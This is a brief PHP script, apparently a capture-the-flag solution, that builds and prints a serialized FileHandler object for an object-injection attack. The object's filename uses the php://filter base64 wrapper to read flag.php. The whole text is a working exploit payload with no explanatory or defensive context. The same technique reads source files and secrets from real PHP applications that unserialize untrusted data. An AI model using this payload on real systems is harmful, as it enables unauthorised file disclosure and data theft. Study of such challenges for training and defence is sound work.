<?php
class FileHandler{
    public $op=2;
    public $filename="php://filter/convert.base64-encode/resource=flag.php";
    public $content;

}
$a=new FileHandler;
echo(serialize($a));